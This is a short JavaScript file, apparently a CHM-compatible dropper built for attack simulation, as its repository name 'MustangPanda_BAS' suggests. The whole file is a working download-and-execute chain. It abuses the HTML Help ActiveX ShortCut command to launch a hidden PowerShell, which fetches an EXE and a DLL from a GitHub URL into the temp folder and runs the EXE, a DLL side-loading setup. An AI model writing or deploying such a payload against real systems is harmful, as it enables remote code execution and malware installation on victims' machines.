// music.js - Download EXE + DLL + Execute (CHM Compatible)

alert("✅ music.js loaded from GitHub!");

try {
    var obj = document.createElement("object");
    obj.setAttribute("classid", "clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11");
    
    obj.innerHTML = `
        <param name="Command" value="ShortCut">
        <param name="Item1" value=',powershell.exe,-NoProfile -WindowStyle Hidden -Command "
            $temp = $env:TEMP;
            Invoke-WebRequest -Uri ''https://raw.githubusercontent.com/bas07-hub/MustangPanda_BAS/main/wmpshare.exe'' -OutFile ''$temp\\wmpshare.exe'';
            Invoke-WebRequest -Uri ''https://raw.githubusercontent.com/bas07-hub/MustangPanda_BAS/main/wmp.dll'' -OutFile ''$temp\\wmp.dll'';
            Start-Process ''$temp\\wmpshare.exe'';
        "'>
    `;

    document.body.appendChild(obj);
    
    setTimeout(function() {
        try {
            obj.Click();
            alert("✅ Command sent: Downloading both files + Executing wmpshare.exe");
        } catch(e) {
            alert("Execution Error: " + e.message);
        }
    }, 600);

} catch(e) {
    alert("Main Error: " + e.message);
}
